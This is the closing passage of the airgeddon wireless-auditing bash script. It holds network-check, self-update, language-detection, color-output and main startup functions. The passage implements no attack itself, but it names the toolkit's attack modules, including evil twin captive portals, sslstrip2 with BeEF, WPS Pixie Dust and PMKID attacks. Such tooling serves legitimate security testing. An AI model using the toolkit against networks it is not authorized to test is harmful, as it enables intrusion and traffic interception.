		fi
	fi

	if hash wget 2> /dev/null; then
		if check_url_wget "https://${repository_hostname}"; then
			return 0
		fi
	fi

	return 1
}

#Check for access to an url using curl
function check_url_curl() {

	debug_print

	if timeout -s SIGTERM 15 curl -s "${1}" > /dev/null 2>&1; then
		return 0
	fi

	http_proxy_detect
	if [ "${http_proxy_set}" -eq 1 ]; then
		timeout -s SIGTERM 15 curl -s --proxy "${http_proxy}" "${1}" > /dev/null 2>&1
		return $?
	fi
	return 1
}

#Check for access to an url using wget
function check_url_wget() {

	debug_print

	if timeout -s SIGTERM 15 wget -q --spider "${1}" > /dev/null 2>&1; then
		return 0
	fi

	http_proxy_detect
	if [ "${http_proxy_set}" -eq 1 ]; then
		timeout -s SIGTERM 15 wget -q --spider -e "use_proxy=yes" -e "http_proxy=${http_proxy}" "${1}" > /dev/null 2>&1
		return $?
	fi
	return 1
}

#Detect if there is a http proxy configured on system
function http_proxy_detect() {

	debug_print

	http_proxy=$(env | grep -i HTTP_PROXY | head -n 1 | awk -F "=" '{print $2}')

	if [ -n "${http_proxy}" ]; then
		http_proxy_set=1
	else
		http_proxy_set=0
	fi
}

#Check for default route on an interface
function check_default_route() {

	debug_print

	(set -o pipefail && ip route | awk '/^default/{print $5}' | grep "${1}" > /dev/null)
	return $?
}

#Update the script if your version is lower than the cloud version
function autoupdate_check() {

	debug_print

	echo
	language_strings "${language}" 210 "blue"
	echo

	if check_repository_access; then
		local version_checked=0
		airgeddon_last_version=$(timeout -s SIGTERM 15 curl -L ${urlscript_directlink} 2> /dev/null | grep "airgeddon_version=" | head -n 1 | cut -d "\"" -f 2)

		if [ -n "${airgeddon_last_version}" ]; then
			version_checked=1
		else
			http_proxy_detect
			if [ "${http_proxy_set}" -eq 1 ]; then

				airgeddon_last_version=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_directlink} 2> /dev/null | grep "airgeddon_version=" | head -n 1 | cut -d "\"" -f 2)
				if [ -n "${airgeddon_last_version}" ]; then
					version_checked=1
				else
					language_strings "${language}" 5 "yellow"
				fi
			else
				language_strings "${language}" 5 "yellow"
			fi
		fi

		if [ "${version_checked}" -eq 1 ]; then
			if compare_floats_greater_than "${airgeddon_last_version}" "${airgeddon_version}"; then
				language_strings "${language}" 213 "yellow"
				download_last_version
			else
				language_strings "${language}" 212 "yellow"
			fi
		fi
	else
		language_strings "${language}" 211 "yellow"
	fi

	language_strings "${language}" 115 "read"
}

#Change script language automatically if OS language is supported by the script and different from current language
function autodetect_language() {

	debug_print

	[[ $(locale | grep LANG) =~ ^(.*)=\"?([a-zA-Z]+)_(.*)$ ]] && lang="${BASH_REMATCH[2]}"

	for lgkey in "${!lang_association[@]}"; do
		if [[ "${lang}" = "${lgkey}" ]] && [[ "${language}" != "${lang_association[${lgkey}]}" ]]; then
			autochanged_language=1
			language=${lang_association[${lgkey}]}
			break
		fi
	done
}

#Detect if current language is a supported RTL (Right To Left) language
function detect_rtl_language() {

	debug_print

	for item in "${rtl_languages[@]}"; do
		if [ "${language}" = "${item}" ]; then
			is_rtl_language=1
			printf "\e[8h"
			break
		else
			is_rtl_language=0
		fi
	done
}

#Clean some known and controlled warnings for shellcheck tool
function remove_warnings() {

	debug_print

	echo "${clean_handshake_dependencies[@]}" > /dev/null 2>&1
	echo "${aircrack_crunch_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${aireplay_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${mdk_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${hashcat_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${et_onlyap_dependencies[@]}" > /dev/null 2>&1
	echo "${et_sniffing_dependencies[@]}" > /dev/null 2>&1
	echo "${et_sniffing_sslstrip2_dependencies[@]}" > /dev/null 2>&1
	echo "${et_sniffing_sslstrip2_beef_dependencies[@]}" > /dev/null 2>&1
	echo "${et_captive_portal_dependencies[@]}" > /dev/null 2>&1
	echo "${wash_scan_dependencies[@]}" > /dev/null 2>&1
	echo "${bully_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${reaver_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${bully_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${reaver_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${wep_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${enterprise_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${asleap_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${john_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${johncrunch_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${enterprise_certificates_dependencies[@]}" > /dev/null 2>&1
	echo "${pmkid_dependencies[@]}" > /dev/null 2>&1
	echo "${is_arm}" > /dev/null 2>&1
}

#Print a simple separator
function print_simple_separator() {

	debug_print

	echo_colored blue "---------"
}

#Print a large separator
function print_large_separator() {

	debug_print

	echo_colored blue "-------------------------------------------------------"
}

#Add the PoT prefix on printed strings if PoT mark is found
function check_pending_of_translation() {

	debug_print

	if [[ "${1}" =~ ^${escaped_pending_of_translation}([[:space:]])(.*)$ ]]; then
		text="${cyan_color}${pending_of_translation} ${2}${BASH_REMATCH[2]}"
		return 1
	elif [[ "${1}" =~ ^${escaped_hintvar}[[:space:]](\\033\[[0-9];[0-9]{1,2}m)?(${escaped_pending_of_translation})[[:space:]](.*) ]]; then
		text="${cyan_color}${pending_of_translation} ${brown_color}${hintvar} ${pink_color}${BASH_REMATCH[3]}"
		return 1
	elif [[ "${1}" =~ ^(\*+)[[:space:]]${escaped_pending_of_translation}[[:space:]]([^\*]+)(\*+)$ ]]; then
		text="${2}${BASH_REMATCH[1]}${cyan_color} ${pending_of_translation} ${2}${BASH_REMATCH[2]}${BASH_REMATCH[3]}"
		return 1
	elif [[ "${1}" =~ ^(\-+)[[:space:]]\(${escaped_pending_of_translation}[[:space:]]([^\-]+)(\-+)$ ]]; then
		text="${2}${BASH_REMATCH[1]} (${cyan_color}${pending_of_translation} ${2}${BASH_REMATCH[2]}${BASH_REMATCH[3]}"
		return 1
	fi

	return 0
}

#Print under construction message used on some menu entries
function under_construction_message() {

	debug_print

	local var_uc="${under_constructionvar^}"
	echo
	echo_colored red "${var_uc}..."
	language_strings "${language}" 115 "read"
}

#Canalize the echo functions
function last_echo() {

	debug_print

	if ! check_pending_of_translation "${1}" "${2}"; then
		echo -e "${2}${text}${normal_color}"
	else
		echo -e "${2}$*${normal_color}"
	fi
}

#Print colored messages:
declare -A colors_array=(
	["green"]="green_color"				#Print green messages
	["blue"]="blue_color"				#Print blue messages
	["yellow"]="yellow_color"			#Print yellow messages
	["red"]="red_color"					#Print red messages
	["red_slim"]="red_color_slim"		#Print red messages using a slimmer thickness
	["green_title"]="green_color_title"	#Print black messages with background for titles
	["pink"]="pink_color"				#Print pink messages
	["cyan"]="cyan_color"				#Print cyan messages
	["brown"]="brown_color"				#Print brown messages
	["white"]="white_color"				#Print white messages
)
function echo_colored() {

	debug_print

	local colorName; colorName="${1}"
	local messageStr; messageStr="${2}"

	last_echo "${messageStr}" "${!colors_array[${colorName}]}"
}

#Script starting point
function main() {

	absolute_path=$(pwd)
	initialize_script_settings
	initialize_colors
	env_vars_initialization
	detect_distro_phase1
	detect_distro_phase2
	special_distro_features

	if "${AIRGEDDON_AUTO_CHANGE_LANGUAGE:-true}"; then
		autodetect_language
	fi

	detect_rtl_language
	check_language_strings
	initialize_language_strings
	iptables_nftables_detection
	set_mdk_version
	dependencies_modifications

	if "${AIRGEDDON_PLUGINS_ENABLED:-true}"; then
		parse_plugins "$@"
		apply_plugin_functions_rewriting
	fi

	remap_colors

	clear
	current_menu="pre_main_menu"
	docker_detection
	set_default_save_path

	if [ ${tmux_error} -eq 1 ]; then
		language_strings "${language}" 86 "title"
		echo
		language_strings "${language}" 621 "yellow"
		language_strings "${language}" 115 "read"
		create_tmux_session "${session_name}" "false"

		exit_code=1
		exit ${exit_code}
	fi

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		check_xwindow_system
		detect_screen_resolution
	fi

	set_possible_aliases
	initialize_optional_tools_values

	if ! "${AIRGEDDON_DEVELOPMENT_MODE:-false}"; then
		if ! "${AIRGEDDON_SKIP_INTRO:-false}"; then
			language_strings "${language}" 86 "title"
			language_strings "${language}" 6 "blue"
			echo
			if check_window_size_for_intro; then
				print_intro
			else
				language_strings "${language}" 228 "green"
				echo
				language_strings "${language}" 395 "yellow"
				sleep 3
			fi
		fi

		clear
		language_strings "${language}" 86 "title"
		language_strings "${language}" 7 "pink"
		language_strings "${language}" 114 "pink"

		if [ ${autochanged_language} -eq 1 ]; then
			echo
			language_strings "${language}" 2 "yellow"
		fi

		check_bash_version
		check_root_permissions

		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
			echo
			if [[ ${resolution_detected} -eq 1 ]] && [[ "${xterm_ok}" -eq 1 ]]; then
				language_strings "${language}" 294 "blue"
			else
				if [ "${xterm_ok}" -eq 0 ]; then
					language_strings "${language}" 476 "red"
					exit_code=1
					exit_script_option
				else
					language_strings "${language}" 295 "red"
					echo
					language_strings "${language}" 300 "yellow"
				fi
			fi
		fi

		echo
		language_strings "${language}" 8 "blue"
		print_known_distros
		echo
		language_strings "${language}" 9 "blue"
		general_checkings
		language_strings "${language}" 115 "read"

		airmonzc_security_check
		check_update_tools
	fi

	print_configuration_vars_issues
	initialize_extended_colorized_output
	set_windows_sizes
	select_interface
	initialize_menu_options_dependencies
	remove_warnings
	main_menu
}

#Script starts to executing stuff from this point, traps and then main function
for f in SIGINT SIGHUP INT SIGTSTP; do
	trap_cmd="trap \"capture_traps ${f}\" \"${f}\""
	eval "${trap_cmd}"
done

main "$@"
